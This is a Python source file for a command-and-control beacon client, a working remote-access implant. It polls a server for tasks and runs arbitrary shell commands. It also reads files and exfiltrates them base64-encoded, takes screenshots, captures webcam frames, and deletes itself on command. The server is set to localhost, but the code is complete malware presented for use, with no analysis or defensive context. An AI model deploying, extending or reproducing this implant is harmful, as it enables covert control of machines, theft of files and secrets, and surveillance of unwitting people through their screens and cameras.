#!/usr/bin/env python3
"""C2 Panel Beacon Client"""
import os, sys, json, base64, uuid, time, subprocess, struct, platform, tempfile

SERVER = "http://localhost:8000"
BEACON_SECRET = "ff5067f4026f811ee3cce00c9c62e07f340a31bcf7cc16d976cb88931a1ce5b6b77a14cf8cd52d349548161be9e799d47b0a8e3f4d619853ca105287e891ca27"

HOSTNAME = platform.node()
OS_INFO = f"{platform.system()} {platform.release()}"
USERNAME = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"
UUID_FILE = os.path.join(tempfile.gettempdir(), ".c2_beacon_id")

def get_uuid():
    if os.path.exists(UUID_FILE):
        with open(UUID_FILE) as f: return f.read().strip()
    uid = str(uuid.uuid4())
    with open(UUID_FILE, "w") as f: f.write(uid)
    return uid

BEACON_UUID = get_uuid()

def http_post(action, data=None, files=None):
    import urllib.request, urllib.error
    url = f"{SERVER}/api.php?action={action}"
    headers = {"Authorization": f"Bearer {BEACON_SECRET}"}
    if files:
        import http.client
        boundary = "----WebKitFormBoundary" + uuid.uuid4().hex[:24]
        body = b""
        for k, v in data.items() if data else []:
            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
        for field, (fname, fdata, ftype) in files.items():
            body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{field}\"; filename=\"{fname}\"\r\nContent-Type: {ftype}\r\n\r\n".encode()
            body += fdata + b"\r\n"
        body += f"--{boundary}--\r\n".encode()
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    else:
        headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=json.dumps(data).encode() if data else None, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        body = e.read().decode() if e.fp else "{}"
        print(f"  [HTTP {e.code}] {body}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"  [ERROR] {e}", file=sys.stderr)
        return None

def checkin():
    data = {"uuid": BEACON_UUID, "hostname": HOSTNAME, "os": OS_INFO, "username": USERNAME, "privilege": "user", "pid": os.getpid(), "ip": "127.0.0.1"}
    resp = http_post("beacon", data)
    if resp:
        tasks = resp.get("tasks", [])
        sleep = resp.get("sleep", 10)
        return tasks, sleep
    return [], 30

def submit_result(task_id, output, status="completed"):
    http_post("result", {"task_id": task_id, "beacon_uuid": BEACON_UUID, "output": output, "status": status})

def exec_shell(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return (r.stdout + r.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"

def browse(path):
    path = os.path.expanduser(path or "/")
    try:
        entries = []
        for entry in os.scandir(path):
            try:
                st = entry.stat()
                entries.append({
                    "name": entry.name, "type": "dir" if entry.is_dir() else "file",
                    "size": st.st_size, "modified": time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(st.st_mtime)),
                    "perms": oct(st.st_mode & 0o777)
                })
            except OSError:
                pass
        return json.dumps({"files": entries, "path": path})
    except Exception as e:
        return json.dumps({"error": str(e)})

def read_file(path):
    path = os.path.expanduser(path)
    try:
        with open(path, "rb") as f:
            content = f.read()
        try:
            return content.decode("utf-8", errors="replace")
        except UnicodeDecodeError:
            return base64.b64encode(content).decode()
    except Exception as e:
        return f"[ERROR] {e}"

def upload_file(path):
    path = os.path.expanduser(path)
    try:
        with open(path, "rb") as f:
            data = f.read()
        name = os.path.basename(path)
        resp = http_post("file", {"beacon_uuid": BEACON_UUID, "filename": name, "data": base64.b64encode(data).decode()})
        if resp and resp.get("status") == "uploaded":
            return f"[UPLOADED] {name}"
        return f"[FAILED] {name}"
    except Exception as e:
        return f"[ERROR] {e}"

def screenshot():
    try:
        import io
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        data = base64.b64encode(buf.getvalue()).decode()
        resp = http_post("media_upload", {"beacon_uuid": BEACON_UUID, "type": "screenshot", "data": data})
        return "[MEDIA] screenshot uploaded" if resp else "[FAILED] screenshot"
    except ImportError:
        return "[SKIP] install Pillow: pip install Pillow"
    except Exception as e:
        return f"[ERROR] screenshot: {e}"

def camera():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return "[FAILED] no camera"
        ret, frame = cap.read()
        cap.release()
        if not ret: return "[FAILED] no frame"
        _, buf = cv2.imencode(".jpg", frame)
        data = base64.b64encode(buf.tobytes()).decode()
        resp = http_post("media_upload", {"beacon_uuid": BEACON_UUID, "type": "camera", "data": data})
        return "[MEDIA] camera capture uploaded" if resp else "[FAILED] camera"
    except ImportError:
        return "[SKIP] install opencv: pip install opencv-python"
    except Exception as e:
        return f"[ERROR] camera: {e}"

def selfdestruct():
    try:
        os.remove(__file__)
        if os.path.exists(UUID_FILE): os.remove(UUID_FILE)
    except OSError:
        pass
    os._exit(0)

def execute_task(task):
    tid = task.get("id")
    cmd = task.get("command", "").strip()
    print(f"  Task #{tid}: {cmd}", file=sys.stderr)
    if not cmd:
        submit_result(tid, "[ERROR] empty command")
        return
    parts = cmd.split(" ", 1)
    action = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""
    if action == "shell":
        output = exec_shell(arg)
    elif action == "browse":
        output = browse(arg)
    elif action == "read":
        output = read_file(arg)
    elif action == "upload":
        output = upload_file(arg)
    elif action == "screenshot":
        output = screenshot()
    elif action == "cam" or action == "camera":
        output = camera()
    elif action == "selfdestruct":
        output = "[SELFDESTRUCT]"
        submit_result(tid, output)
        selfdestruct()
        return
    elif action == "persist":
        output = persist()
    else:
        output = exec_shell(cmd)
    submit_result(tid, output)
    preview = output[:120].replace("\n", "\\n")
    print(f"  -> {preview}{'...' if len(output)>120 else ''}", file=sys.stderr)

def persist():
    return "[SKIP] persistence not implemented"

def main():
    print(f"[C2 Beacon] {BEACON_UUID[:8]} @ {SERVER}", file=sys.stderr)
    while True:
        tasks, sleep_sec = checkin()
        if tasks:
            print(f"[+] {len(tasks)} task(s) received", file=sys.stderr)
            for t in tasks:
                execute_task(t)
        else:
            print(f"[-] No tasks (sleep {sleep_sec}s)", file=sys.stderr)
        time.sleep(sleep_sec)

if __name__ == "__main__":
    main()
